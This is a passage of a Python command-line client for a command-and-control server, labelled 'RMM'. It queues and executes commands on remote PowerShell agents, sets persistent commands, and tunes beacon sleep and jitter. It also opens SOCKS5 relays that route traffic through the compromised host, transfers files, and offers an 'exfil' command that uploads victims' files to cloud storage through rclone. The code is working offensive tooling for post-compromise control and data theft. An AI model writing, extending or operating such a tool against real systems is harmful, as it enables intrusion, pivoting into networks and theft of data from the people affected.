                    warn(f"failed ({code})")
                continue
            if cmd == "socks":
                if rest and rest[0].lower() == "list":
                    code, data = client.list_socks()
                    if code != 200:
                        warn(f"socks list failed ({code}): {data}")
                    else:
                        print_socks_relays(data.get("relays", []), json_mode=json_mode)
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                if rest and rest[0].lower() == "stop":
                    code, _ = client.stop_socks(sid)
                    if code == 200:
                        say("SOCKS relay stopped")
                    else:
                        warn(f"failed ({code})")
                    continue
                port = 1080
                if rest:
                    try:
                        port = int(rest[0])
                        if port < 1 or port > 65535:
                            raise ValueError
                    except ValueError:
                        warn("Invalid port (1-65535)")
                        continue
                code, data = client.start_socks(sid, port=port)
                if code == 200:
                    url = data.get("socks_url", f"socks5://127.0.0.1:{port}")
                    say(f"SOCKS5 listening — use {url} (traffic exits remote host)")
                else:
                    warn(f"failed ({code}): {data}")
                continue
            if cmd == "run":
                if not rest:
                    warn("Usage: run <command>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                command = " ".join(rest)
                code, _ = client.queue_command(sid, command)
                if code == 200:
                    say("Queued")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "exec":
                if not rest:
                    warn("Usage: exec <command>")
                    continue
                sid = _active_session(client, state)
                if not sid:
                    warn("No session selected. Use: use <id>")
                    continue
                command = " ".join(rest)
                say("Waiting for agent (up to 120s — depends on beacon interval)...")
                code, edata = client.exec_command(sid, command, timeout=120)
                if code == 408:
                    warn("Timeout waiting for agent")
                elif code != 200:
                    warn(f"exec failed ({code})")
                elif edata.get("event"):
                    print_event(
                        edata["event"],
                        json_mode,
                        session_prefix=sid[:8],
                        session_id=sid,
                        state=state,
                    )
                    _drain_cli_output()
                    _event_cursor(state)[sid] = max(
                        _event_cursor(state).get(sid, 0), edata["event"].get("id", 0)
                    )
                continue
            if cmd == "persist":
                if not rest:
                    warn("Usage: persist <command>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                code, _ = client.queue_command(sid, " ".join(rest), "persistent")
                if code == 200:
                    say("Persistent command set")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "stop":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                code, _ = client.queue_command(sid, "__STOP__")
                if code == 200:
                    say("Persistent command stopped")
                else:
                    warn(f"failed ({code})")
                continue

            # Default: remote command (queued), like embedded server CLI
            sid = _active_session(client, state)
            if not sid:
                warn("No session selected. Use: use <id>")
                continue
            command = line.strip()
            code, _ = client.queue_command(sid, command)
            if code != 200:
                warn(f"queue failed ({code})")

    with patch_stdout():
        threading.Thread(
            target=_output_drainer_loop, args=(state,), daemon=True
        ).start()
        threading.Thread(
            target=_event_poller, args=(client, state, json_mode), daemon=True
        ).start()

        code, sdata = client.list_sessions()
        if code == 200:
            for s in sdata.get("sessions", []):
                _sync_event_cursor(client, state, s["id"])

        n = data.get("sessions", 0)
        say(f"Connected to {client.base_url} ({n} session(s)).")
        if n == 0:
            say("  No agents yet — wait for the PowerShell client to register, then run: list")
        else:
            say("  Run: list   then: use <first-8-chars-of-id>   then: exec whoami")
        say("Input line stays at the bottom; results appear automatically (no Enter needed).\n")
        cur = current_session(state)
        if cur:
            say(f"Transcript filtered to session [{cur[:8]}] — use background to see all.\n")
        _show_help()
        try:
            _interactive_loop()
        finally:
            state["interactive_running"] = False

    _cli_use_ptk = False
    _main_thread_id = None
    say("Goodbye.")


def cmd_events(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.get_events(sid, since=args.since, limit=args.limit)
    if code != 200:
        die(f"events failed ({code}): {data}")
    if args.json:
        print_json(data)
        return
    for ev in data.get("events", []):
        cmd = ev.get("command") or ""
        suffix = f" » {cmd}" if cmd else ""
        print(f"[{ev['id']}] {ev['timestamp']} {ev['type']}{suffix}")
        body = ev.get("body", "")
        if ev.get("artifact"):
            print(f"  artifact: {ev['artifact']}")
        if body:
            print(body.rstrip())
        print("-" * 40)


def build_parser() -> argparse.ArgumentParser:
    shared = argparse.ArgumentParser(add_help=False)
    shared.add_argument("--json", action="store_true", help="JSON output")

    p = argparse.ArgumentParser(description="RMM operator CLI (REST API client)")
    p.add_argument(
        "--url",
        default=DEFAULT_URL,
        help="Server URL (env: RMM_SERVER_URL or RMM_BASE_URL; default: %(default)s)",
    )
    p.add_argument("--token", default=DEFAULT_TOKEN, help="API token (or RMM_API_TOKEN)")

    sub = p.add_subparsers(dest="command", required=False)
    p.add_argument(
        "-i", "--interactive",
        action="store_true",
        help="Interactive console (default when no subcommand is given)",
    )

    sub.add_parser("health", parents=[shared], help="API health check").set_defaults(func=cmd_health)
    sp_ix = sub.add_parser("interactive", parents=[shared], aliases=["shell", "console"],
                            help="Interactive operator console")
    sp_ix.set_defaults(func=lambda c, s, a: run_interactive(c, s, a.json))

    sp = sub.add_parser("sessions", help="Session management")
    sp_sub = sp.add_subparsers(dest="sessions_cmd", required=True)
    sp_list = sp_sub.add_parser("list", parents=[shared], help="List sessions")
    sp_list.set_defaults(func=cmd_sessions_list)

    sp = sub.add_parser("session", help="Select / inspect / kill a session")
    sp_sub = sp.add_subparsers(dest="session_cmd", required=True)
    sp_use = sp_sub.add_parser("use", help="Select session (prefix ok)")
    sp_use.add_argument("session_id")
    sp_use.set_defaults(func=cmd_session_use)
    sp_info = sp_sub.add_parser("info", parents=[shared], help="Session details")
    sp_info.add_argument("--session", "-s", default=None)
    sp_info.set_defaults(func=cmd_session_info)
    sp_kill = sp_sub.add_parser("kill", parents=[shared], help="Kill session")
    sp_kill.add_argument("--session", "-s", default=None)
    sp_kill.set_defaults(func=cmd_session_kill)

    sp_run = sub.add_parser("run", parents=[shared], help="Queue command (non-blocking)")
    sp_run.add_argument("command")
    sp_run.add_argument("--session", "-s", default=None)
    sp_run.add_argument("--type", choices=["oneshot", "persistent"], default="oneshot")
    sp_run.set_defaults(func=cmd_run)

    sp_exec = sub.add_parser("exec", parents=[shared], help="Run command and wait for output")
    sp_exec.add_argument("command", nargs="?", default=None)
    sp_exec.add_argument("-f", "--command-file", help="Read command from file")
    sp_exec.add_argument("--session", "-s", default=None)
    sp_exec.add_argument("--wait", type=float, default=120, help="Timeout seconds")
    sp_exec.set_defaults(func=cmd_exec)

    sp_cfg = sub.add_parser("config", help="Beacon configuration")
    sp_cfg_sub = sp_cfg.add_subparsers(dest="config_cmd", required=True)
    sp_sleep = sp_cfg_sub.add_parser("set-sleep", help="Set sleep interval (1-3600)")
    sp_sleep.add_argument("seconds", type=int)
    sp_sleep.add_argument("--session", "-s", default=None)
    sp_sleep.set_defaults(func=cmd_config_set_sleep)
    sp_jit = sp_cfg_sub.add_parser("set-jitter", help="Set jitter percent (0-100)")
    sp_jit.add_argument("percent", type=int)
    sp_jit.add_argument("--session", "-s", default=None)
    sp_jit.set_defaults(func=cmd_config_set_jitter)

    sp_dl = sub.add_parser("download", help="Queue remote file download")
    sp_dl.add_argument("remote_path")
    sp_dl.add_argument("--session", "-s", default=None)
    sp_dl.set_defaults(func=cmd_download)

    sp_exfil = sub.add_parser("exfil", help="Queue remote file exfil via rclone (agent-side upload)")
    sp_exfil.add_argument("remote_path")
    sp_exfil.add_argument("--profile", "-p", default=None, help="Named rclone profile on server")
    sp_exfil.add_argument("--dest", default=None, help="Cloud destination path override")
    sp_exfil.add_argument("--session", "-s", default=None)
    sp_exfil.set_defaults(func=cmd_exfil)

    sp_rcfg = sub.add_parser("rclone-config", help="Show rclone profiles and binary status on server")
    sp_rcfg.add_argument("--json", action="store_true", help="JSON output")
    sp_rcfg.set_defaults(func=cmd_rclone_config)

    sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
    sp_ul.add_argument("local")
    sp_ul.add_argument("remote")
    sp_ul.add_argument("--session", "-s", default=None)
    sp_ul.set_defaults(func=cmd_upload)

    sp_ev = sub.add_parser("events", parents=[shared], help="Poll session result events")
    sp_ev.add_argument("--session", "-s", default=None)
    sp_ev.add_argument("--since", type=int, default=0)
    sp_ev.add_argument("--limit", type=int, default=50)
    sp_ev.set_defaults(func=cmd_events)

    sp_socks = sub.add_parser("socks", help="SOCKS relay management")
    sp_socks_sub = sp_socks.add_subparsers(dest="socks_cmd", required=True)
    sp_socks_list = sp_socks_sub.add_parser(
        "list", parents=[shared], help="List all SOCKS listeners and connected agents"
    )
    sp_socks_list.set_defaults(func=cmd_socks_list)

    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    state = load_state()
    token = args.token or DEFAULT_TOKEN

    if args.command is None or getattr(args, "interactive", False):
        client, data = ensure_client(args.url, token)
        run_interactive(client, state, json_mode=getattr(args, "json", False), start_data=data)
        return

    client, _ = ensure_client(args.url, token)

    if args.command == "health":
        cmd_health(client, args)
    else:
        args.func(client, state, args)


if __name__ == "__main__":
    main()
